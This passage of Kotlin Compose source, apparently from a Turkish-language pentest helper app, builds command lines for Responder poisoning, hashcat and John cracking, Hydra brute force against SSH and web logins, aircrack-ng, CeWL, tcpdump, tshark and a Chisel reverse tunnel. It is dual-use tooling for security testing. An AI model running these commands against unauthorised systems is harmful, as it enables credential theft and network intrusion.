    var iface by remember { mutableStateOf("eth0") }
    var wpad by remember { mutableStateOf(true) }
    var dnsPoison by remember { mutableStateOf(true) }
    var forceAuth by remember { mutableStateOf(false) }
    var analyzeOnly by remember { mutableStateOf(false) }
    var verbose by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = iface, onValueChange = { iface = it }, label = { Text("Ağ Arayüzü (-I: eth0, tun0)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-w WPAD Sahte Proxy Saldırısı Yap", checked = wpad, onCheckedChange = { wpad = it })
        ToggleOption(label = "-d Sahte DNS Yanıtları Üret", checked = dnsPoison, onCheckedChange = { dnsPoison = it })
        ToggleOption(label = "-F NTLM Basic Auth İsteklerini Zorla", checked = forceAuth, onCheckedChange = { forceAuth = it })
        ToggleOption(label = "-A Pasif Analiz Modu (Zehirleme yapmadan dinle)", checked = analyzeOnly, onCheckedChange = { analyzeOnly = it })
        ToggleOption(label = "-v Detaylı Ağ Paket Çıktısı", checked = verbose, onCheckedChange = { verbose = it })

        val parts = mutableListOf("sudo responder", "-I", iface)
        if (analyzeOnly) {
            parts.add("-A")
        } else {
            if (wpad) parts.add("-w")
            if (dnsPoison) parts.add("-d")
            if (forceAuth) parts.add("-F")
        }
        if (verbose) parts.add("-v")

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 32. HASHCAT
@Composable
fun HashcatBuilder(language: AppLanguage) {
    var attackMode by remember { mutableStateOf("0") }
    var hashType by remember { mutableStateOf("1000") }
    var hashFile by remember { mutableStateOf("hashes.txt") }
    var wordlist by remember { mutableStateOf("/usr/share/wordlists/rockyou.txt") }
    var maskPattern by remember { mutableStateOf("?u?l?l?l?d?d?s") }
    var ruleFile by remember { mutableStateOf("/usr/share/hashcat/rules/best64.rule") }
    var enableRules by remember { mutableStateOf(false) }
    var optimizedKernel by remember { mutableStateOf(true) }
    var workloadProfile by remember { mutableStateOf("3") }
    var showOnly by remember { mutableStateOf(false) }
    var saveOutput by remember { mutableStateOf(true) }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("0" to "Sözlük (-a 0)", "3" to "Maske (-a 3)", "1" to "Kombinasyon (-a 1)").forEach { (m, lbl) ->
                val sel = attackMode == m
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { attackMode = m }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        Text(text = "YAYGIN HASH TÜRLERİ (-m)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf(
                "1000" to "NTLM (1000)",
                "0" to "MD5 (0)",
                "1800" to "sha512crypt (1800)",
                "22000" to "WPA/WPA2 (22000)",
                "13100" to "Kerberoast (13100)",
                "18200" to "AS-REP (18200)",
                "3200" to "bcrypt (3200)",
                "5600" to "NetNTLMv2 (5600)"
            ).forEach { (ht, lbl) ->
                val sel = hashType == ht
                Box(
                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { hashType = ht }.padding(horizontal = 8.dp, vertical = 5.dp)
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = hashFile, onValueChange = { hashFile = it }, label = { Text("Hash Dosyası") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        if (attackMode == "0" || attackMode == "1") {
            OutlinedTextField(value = wordlist, onValueChange = { wordlist = it }, label = { Text("Wordlist Yolu") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        } else if (attackMode == "3") {
            OutlinedTextField(value = maskPattern, onValueChange = { maskPattern = it }, label = { Text("Mask Şablonu (?u=Büyük ?l=Küçük ?d=Rakam ?s=Özel)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-r Kural Dosyası Kullan ($ruleFile)", checked = enableRules, onCheckedChange = { enableRules = it })
        ToggleOption(label = "-O Optimize GPU Çekirdekleri (Parola <= 32 char)", checked = optimizedKernel, onCheckedChange = { optimizedKernel = it })
        ToggleOption(label = "--show Kırılmış Parolaları Göster", checked = showOnly, onCheckedChange = { showOnly = it })
        ToggleOption(label = "-o cracked.txt Kırılanları Dosyaya Kaydet", checked = saveOutput, onCheckedChange = { saveOutput = it })

        val parts = mutableListOf("hashcat", "-m", hashType, "-a", attackMode)
        if (optimizedKernel) parts.add("-O")
        parts.addAll(listOf("-w", workloadProfile))
        if (enableRules && attackMode == "0") parts.addAll(listOf("-r", ruleFile))
        if (showOnly) parts.add("--show")
        if (saveOutput) parts.addAll(listOf("-o", "cracked.txt"))
        parts.add(hashFile)
        if (attackMode == "0") parts.add(wordlist)
        else if (attackMode == "3") parts.add(maskPattern)

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 33. JOHN THE RIPPER
@Composable
fun JohnBuilder(language: AppLanguage) {
    var hashFile by remember { mutableStateOf("hashes.txt") }
    var format by remember { mutableStateOf("NT") }
    var wordlist by remember { mutableStateOf("/usr/share/wordlists/rockyou.txt") }
    var enableRules by remember { mutableStateOf(false) }
    var forkCount by remember { mutableStateOf("4") }
    var showCracked by remember { mutableStateOf(false) }

    Column {
        OutlinedTextField(value = hashFile, onValueChange = { hashFile = it }, label = { Text("Hash Dosyası") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Text(text = "FORMAT SEÇİMİ (--format)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("NT" to "NTLM (NT)", "raw-md5" to "MD5", "sha512crypt" to "Linux Shadow", "bcrypt" to "bcrypt", "wp" to "WordPress").forEach { (fmt, lbl) ->
                val sel = format == fmt
                Box(
                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { format = fmt }.padding(horizontal = 8.dp, vertical = 5.dp)
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = wordlist, onValueChange = { wordlist = it }, label = { Text("Wordlist Yolu (--wordlist)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "--rules=Jumbo Akıllı Kural Değişimlerini Uygula", checked = enableRules, onCheckedChange = { enableRules = it })
        ToggleOption(label = "--fork=$forkCount Çok Çekirdekli Paralelleştirme", checked = true, onCheckedChange = {})
        ToggleOption(label = "--show Kırılmış Parolaları Listele", checked = showCracked, onCheckedChange = { showCracked = it })

        val parts = mutableListOf("john")
        if (showCracked) {
            parts.addAll(listOf("--show", "--format=$format", hashFile))
        } else {
            parts.addAll(listOf("--format=$format", "--wordlist=$wordlist"))
            if (enableRules) parts.add("--rules=Jumbo")
            parts.addAll(listOf("--fork=$forkCount", hashFile))
        }

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 34. HYDRA
@Composable
fun HydraBuilder(language: AppLanguage) {
    var service by remember { mutableStateOf("ssh") }
    var target by remember { mutableStateOf("10.10.10.100") }
    var port by remember { mutableStateOf("22") }
    var userMode by remember { mutableStateOf("single") }
    var singleUser by remember { mutableStateOf("root") }
    var userList by remember { mutableStateOf("/usr/share/wordlists/usernames.txt") }
    var passMode by remember { mutableStateOf("list") }
    var singlePass by remember { mutableStateOf("password") }
    var passList by remember { mutableStateOf("/usr/share/wordlists/rockyou.txt") }
    var httpFormPath by remember { mutableStateOf("/login.php:user=^USER^&pass=^PASS^:F=Hatalı") }
    var threads by remember { mutableStateOf("16") }
    var stopOnSuccess by remember { mutableStateOf(true) }
    var tryCombos by remember { mutableStateOf(true) }
    var verbose by remember { mutableStateOf(true) }
    var saveOutput by remember { mutableStateOf(true) }

    Column {
        Text(text = "HEDEF SERVİS & PROTOKOL", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("ssh" to "22", "ftp" to "21", "rdp" to "3389", "smb" to "445", "http-post-form" to "80", "mysql" to "3306", "postgres" to "5432").forEach { (srv, defPort) ->
                val sel = service == srv
                Box(
                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable {
                        service = srv
                        port = defPort
                    }.padding(horizontal = 8.dp, vertical = 5.dp)
                ) { Text(text = srv.uppercase(), fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(value = target, onValueChange = { target = it }, label = { Text("Hedef IP") }, modifier = Modifier.weight(2f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            OutlinedTextField(value = port, onValueChange = { port = it }, label = { Text("Port (-s)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(value = if (userMode == "single") singleUser else userList, onValueChange = { if (userMode == "single") singleUser = it else userList = it }, label = { Text(if (userMode == "single") "Kullanıcı (-l)" else "Kullanıcı Listesi (-L)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            OutlinedTextField(value = if (passMode == "single") singlePass else passList, onValueChange = { if (passMode == "single") singlePass = it else passList = it }, label = { Text(if (passMode == "single") "Parola (-p)" else "Parola Listesi (-P)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        if (service == "http-post-form") {
            Spacer(modifier = Modifier.height(8.dp))
            OutlinedTextField(value = httpFormPath, onValueChange = { httpFormPath = it }, label = { Text("Form Şablonu (path:body:fail_condition)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-f İlk Bulunan Geçerli Girişte Dur", checked = stopOnSuccess, onCheckedChange = { stopOnSuccess = it })
        ToggleOption(label = "-e nsr Boş Parola, User=Pass, Ters Parola Dene", checked = tryCombos, onCheckedChange = { tryCombos = it })
        ToggleOption(label = "-vV Ayrıntılı Giriş Denemelerini Göster", checked = verbose, onCheckedChange = { verbose = it })
        ToggleOption(label = "-o hydra_cracked.txt Dosyaya Kaydet", checked = saveOutput, onCheckedChange = { saveOutput = it })

        val parts = mutableListOf("hydra")
        if (userMode == "single") parts.addAll(listOf("-l", singleUser)) else parts.addAll(listOf("-L", userList))
        if (passMode == "single") parts.addAll(listOf("-p", singlePass)) else parts.addAll(listOf("-P", passList))
        if (port != "22" && port != "80") parts.addAll(listOf("-s", port))
        if (stopOnSuccess) parts.add("-f")
        if (tryCombos) parts.add("-e nsr")
        if (verbose) parts.add("-vV")
        parts.addAll(listOf("-t", threads))
        if (saveOutput) parts.addAll(listOf("-o", "hydra_cracked.txt"))
        parts.add(target)
        parts.add(service)
        if (service == "http-post-form") parts.add("\"$httpFormPath\"")

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 35. AIRCRACK-NG
@Composable
fun AircrackNgBuilder(language: AppLanguage) {
    var capFile by remember { mutableStateOf("capture.cap") }
    var wordlist by remember { mutableStateOf("/usr/share/wordlists/rockyou.txt") }
    var bssid by remember { mutableStateOf("00:11:22:33:44:55") }
    var essid by remember { mutableStateOf("") }
    var korek by remember { mutableStateOf(false) }
    var quiet by remember { mutableStateOf(false) }

    Column {
        OutlinedTextField(value = capFile, onValueChange = { capFile = it }, label = { Text("Yakalama Dosyası (.cap / .pcap)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = wordlist, onValueChange = { wordlist = it }, label = { Text("Parola Listesi (-w)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(value = bssid, onValueChange = { bssid = it }, label = { Text("Hedef AP BSSID (-b)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            OutlinedTextField(value = essid, onValueChange = { essid = it }, label = { Text("ESSID (-e: opsiyonel)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-K KoreK Saldırısı (WEP)", checked = korek, onCheckedChange = { korek = it })
        ToggleOption(label = "-q Sessiz Mod", checked = quiet, onCheckedChange = { quiet = it })

        val parts = mutableListOf("aircrack-ng", "-w", wordlist)
        if (bssid.isNotBlank()) parts.addAll(listOf("-b", bssid))
        if (essid.isNotBlank()) parts.addAll(listOf("-e", "\"$essid\""))
        if (korek) parts.add("-K")
        if (quiet) parts.add("-q")
        parts.add(capFile)

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 36. CEWL
@Composable
fun CewlBuilder(language: AppLanguage) {
    var url by remember { mutableStateOf("https://example.com") }
    var depth by remember { mutableStateOf("2") }
    var minLen by remember { mutableStateOf("6") }
    var emailExtract by remember { mutableStateOf(true) }
    var lowercase by remember { mutableStateOf(false) }
    var saveOutput by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = url, onValueChange = { url = it }, label = { Text("Hedef Web Sitesi URL'si") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(value = depth, onValueChange = { depth = it }, label = { Text("Derinlik (-d)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            OutlinedTextField(value = minLen, onValueChange = { minLen = it }, label = { Text("Min Uzunluk (-m)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-e E-posta Adreslerini de Topla", checked = emailExtract, onCheckedChange = { emailExtract = it })
        ToggleOption(label = "--lowercase Tüm Kelimeleri Küçük Harfe Dönüştür", checked = lowercase, onCheckedChange = { lowercase = it })
        ToggleOption(label = "-w cewl_wordlist.txt Çıktıyı Dosyaya Yaz", checked = saveOutput, onCheckedChange = { saveOutput = it })

        val parts = mutableListOf("cewl", "-d", depth, "-m", minLen)
        if (emailExtract) parts.add("-e")
        if (lowercase) parts.add("--lowercase")
        if (saveOutput) parts.addAll(listOf("-w", "cewl_wordlist.txt"))
        parts.add(url)

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 37. NAME-THAT-HASH
@Composable
fun NameThatHashBuilder(language: AppLanguage) {
    var hashInput by remember { mutableStateOf("098f6bcd4621d373cade4e832627b4f6") }
    var isFile by remember { mutableStateOf(false) }
    var popularOnly by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = hashInput, onValueChange = { hashInput = it }, label = { Text(if (isFile) "Hash Dosyası (-f)" else "Hash Metni (-t)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-f Dosyadan Oku", checked = isFile, onCheckedChange = { isFile = it })
        ToggleOption(label = "--popular Sadece Yaygın Hash Türlerini Göster", checked = popularOnly, onCheckedChange = { popularOnly = it })

        val parts = mutableListOf("nth")
        if (isFile) parts.addAll(listOf("-f", hashInput)) else parts.addAll(listOf("-t", "\"$hashInput\""))
        if (popularOnly) parts.add("--popular")

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// -------------------------------------------------------------
// 5. PACKET & SNIFFING BUILDERS
// -------------------------------------------------------------

// 38. TCPDUMP
@Composable
fun TcpdumpBuilder(language: AppLanguage) {
    var iface by remember { mutableStateOf("eth0") }
    var bpfFilter by remember { mutableStateOf("tcp port 80") }
    var noDns by remember { mutableStateOf(true) }
    var verbose by remember { mutableStateOf(true) }
    var hexAscii by remember { mutableStateOf(false) }
    var snaplenZero by remember { mutableStateOf(true) }
    var countLimit by remember { mutableStateOf("100") }
    var enableCount by remember { mutableStateOf(false) }
    var savePcap by remember { mutableStateOf(false) }

    Column {
        OutlinedTextField(value = iface, onValueChange = { iface = it }, label = { Text("Arayüz (-i: eth0, any, tun0, wlan0)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Text(text = "BPF FİLTRE ŞABLONLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf(
                "tcp port 80" to "HTTP",
                "port 53" to "DNS",
                "icmp" to "ICMP",
                "tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0" to "SYN Only",
                "net 10.10.10.0/24" to "Subnet"
            ).forEach { (f, lbl) ->
                val sel = bpfFilter == f
                Box(
                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { bpfFilter = f }.padding(horizontal = 8.dp, vertical = 5.dp)
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = bpfFilter, onValueChange = { bpfFilter = it }, label = { Text("Özel BPF Filtresi") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-nn IP ve Port İsimlerini Sayısal Göster (No DNS)", checked = noDns, onCheckedChange = { noDns = it })
        ToggleOption(label = "-v Ayrıntılı Paket Başlıkları", checked = verbose, onCheckedChange = { verbose = it })
        ToggleOption(label = "-X Paket İçeriğini Hex ve ASCII Göster", checked = hexAscii, onCheckedChange = { hexAscii = it })
        ToggleOption(label = "-s 0 Paketleri Kesmeden Tam Yakala", checked = snaplenZero, onCheckedChange = { snaplenZero = it })
        ToggleOption(label = "-c $countLimit Paket Yakala ve Dur", checked = enableCount, onCheckedChange = { enableCount = it })
        ToggleOption(label = "-w capture.pcap Dosyaya Kaydet", checked = savePcap, onCheckedChange = { savePcap = it })

        val parts = mutableListOf("sudo tcpdump", "-i", iface)
        if (noDns) parts.add("-nn")
        if (verbose) parts.add("-v")
        if (hexAscii) parts.add("-X")
        if (snaplenZero) parts.addAll(listOf("-s", "0"))
        if (enableCount) parts.addAll(listOf("-c", countLimit))
        if (savePcap) parts.addAll(listOf("-w", "capture.pcap"))
        if (bpfFilter.isNotBlank()) parts.add("'$bpfFilter'")

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 39. TSHARK
@Composable
fun TsharkBuilder(language: AppLanguage) {
    var mode by remember { mutableStateOf("live") }
    var iface by remember { mutableStateOf("eth0") }
    var pcapFile by remember { mutableStateOf("capture.pcap") }
    var displayFilter by remember { mutableStateOf("http.request.method == \"POST\"") }
    var extractFields by remember { mutableStateOf(false) }
    var fields by remember { mutableStateOf("ip.src ip.dst http.host http.user_agent") }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            listOf("live" to "Canlı Yakalama (-i)", "file" to "Dosyadan Oku (-r)").forEach { (m, lbl) ->
                val sel = mode == m
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { mode = m }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        if (mode == "live") {
            OutlinedTextField(value = iface, onValueChange = { iface = it }, label = { Text("Arayüz (-i)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        } else {
            OutlinedTextField(value = pcapFile, onValueChange = { pcapFile = it }, label = { Text("PCAP Dosya Yolu (-r)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = displayFilter, onValueChange = { displayFilter = it }, label = { Text("Wireshark Ekran Filtresi (-Y)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-T fields Belirli Alanları Ayrıştır (-e)", checked = extractFields, onCheckedChange = { extractFields = it })
        if (extractFields) {
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(value = fields, onValueChange = { fields = it }, label = { Text("Alanlar (örn: ip.src ip.dst http.host)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }

        val parts = mutableListOf("tshark")
        if (mode == "live") parts.addAll(listOf("-i", iface, "-n")) else parts.addAll(listOf("-r", pcapFile))
        if (displayFilter.isNotBlank()) parts.addAll(listOf("-Y", "'$displayFilter'"))
        if (extractFields) {
            parts.addAll(listOf("-T", "fields"))
            fields.split(" ").filter { it.isNotBlank() }.forEach { f ->
                parts.addAll(listOf("-e", f))
            }
        }

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 40. CHISEL
@Composable
fun ChiselBuilder(language: AppLanguage) {
    var mode by remember { mutableStateOf("server") }
    var port by remember { mutableStateOf("8000") }
    var serverHost by remember { mutableStateOf("10.10.14.5:8000") }
    var tunnelType by remember { mutableStateOf("socks") }
    var localPort by remember { mutableStateOf("1080") }
    var remoteHost by remember { mutableStateOf("172.16.1.100") }
    var remotePort by remember { mutableStateOf("80") }
    var reverse by remember { mutableStateOf(true) }
    var socks5 by remember { mutableStateOf(true) }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            listOf("server" to "Sunucu (Server)", "client" to "İstemci (Client)").forEach { (m, lbl) ->
                val sel = mode == m
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { mode = m }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        if (mode == "server") {
            OutlinedTextField(value = port, onValueChange = { port = it }, label = { Text("Dinleme Portu (-p)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            Spacer(modifier = Modifier.height(6.dp))
            ToggleOption(label = "--reverse Ters Tünellemeye İzin Ver", checked = reverse, onCheckedChange = { reverse = it })
            ToggleOption(label = "--socks5 Dahili SOCKS5 Sunucusu Aç", checked = socks5, onCheckedChange = { socks5 = it })
        } else {
            OutlinedTextField(value = serverHost, onValueChange = { serverHost = it }, label = { Text("Chisel Sunucu Adresi (IP:PORT)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            Spacer(modifier = Modifier.height(8.dp))
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                listOf("socks" to "Ters SOCKS (R:socks)", "forward" to "Port Forward (R:port:host:port)").forEach { (t, lbl) ->
                    val sel = tunnelType == t
                    Box(
